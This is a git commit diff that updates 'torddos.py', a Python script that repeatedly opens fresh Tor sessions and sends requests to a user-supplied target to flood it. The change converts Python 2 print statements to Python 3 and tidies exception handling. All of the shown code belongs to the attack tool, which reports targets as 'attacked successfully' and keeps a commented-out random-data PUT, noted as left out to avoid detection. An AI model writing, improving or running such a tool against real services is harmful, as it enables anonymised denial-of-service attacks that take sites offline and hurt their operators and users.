d82cec50ee28cf89fc3ceedd27d480eb92bc3eea
Yoko <150261719+Dev-Yoko@users.noreply.github.com>
2024-05-18 19:14:43 +0530

    Update torddos.py

--- torddos.py
+++ torddos.py
@@ -16,7 +16,7 @@ def main():
         while counter < max_attempts:
             tor = Tor()
             if not tor.tor_installed():
-                print u'{}[!]{} Tor is not installed. Exiting...'.format(color.RED, color.END)
+                print('{}[!]{} Tor is not installed. Exiting...'.format(color.RED, color.END))
                 sys.exit(1)
             else:
                 # Initial timestamp and increment the counter
@@ -25,42 +25,44 @@ def main():
 
                 # Init a new Tor session
                 session = tor.new_session()
-                print u'{}[!]{} New Tor session initialized...'.format(color.BLUE, color.END)
-                print u'\n{}[+]{} Target: {}{}{}'.format(color.PURPLE, color.END, color.PURPLE, target, color.END)
+                print('{}[!]{} New Tor session initialized...'.format(color.BLUE, color.END))
+                print('\n{}[+]{} Target: {}{}{}'.format(color.PURPLE, color.END, color.PURPLE, target, color.END))
 
                 # Getting data from the server
-                print u'{}[*]{} Getting data from {}...'.format(color.ORANGE, color.END, target)
+                print('{}[*]{} Getting data from {}...'.format(color.ORANGE, color.END, target))
                 session.get(target)
                 # Putting data (omitted, maybe it makes detection easier)
                 # random_bytes = random._urandom(1490)
-                # print u'{}[*]{} Putting data on {}...'.format(color.ORANGE, color.END, target)
+                # print('{}[*]{} Putting data on {}...'.format(color.ORANGE, color.END, target))
                 # session.put(target, random_bytes)
-                print u'{}[*]{} Target {} was attacked succesfully'.format(color.ORANGE, color.END, target)
+                print('{}[*]{} Target {} was attacked successfully'.format(color.ORANGE, color.END, target))
 
-    except KeyboardInterrupt: pass
-    except Exception,exception:
-        print u'\n{}[!]{} An error has occurred:'.format(color.RED, color.END)
-        print u'{}{}{}'.format(color.RED, exception, Exception, color.END)
+    except KeyboardInterrupt:
+        pass
+    except Exception as exception:
+        print('\n{}[!]{} An error has occurred:'.format(color.RED, color.END))
+        print('{}{}{}'.format(color.RED, exception, color.END))
 
     finally:
         end_time = datetime.datetime.now().time().strftime('%H:%M:%S')
         total_time = (datetime.datetime.strptime(end_time, '%H:%M:%S') - datetime.datetime.strptime(start_time, '%H:%M:%S'))
-        print u'{}[+]{} Time elapsed:\t{}'.format(color.GREEN, color.END, total_time)
-        print u'{}[+]{} Number of requests:\t{}'.format(color.GREEN, color.END, counter)
-        print u'{}[!]{} Stopping Tor...'.format(color.RED, color.END)
+        print('{}[+]{} Time elapsed:\t{}'.format(color.GREEN, color.END, total_time))
+        print('{}[+]{} Number of requests:\t{}'.format(color.GREEN, color.END, counter))
+        print('{}[!]{} Stopping Tor...'.format(color.RED, color.END))
         tor.stop_tor()
-        print u'{}[!]{} Exiting...\n'.format(color.RED, color.END)
+        print('{}[!]{} Exiting...\n'.format(color.RED, color.END))
         sys.exit(0)
 
 
 if __name__ == '__main__':
     # Processing args
-    from lib.args import *
+    from lib.args import parser
     args = parser.parse_args()
     target = args.target
     max_attempts = args.max_attempts
     # Print help and exit when it runs without target arg
     if not target:
-        parser.print_help(sys.stdout); sys.exit(2)
+        parser.print_help(sys.stdout)
+        sys.exit(2)
     # Run the main execution
     main()
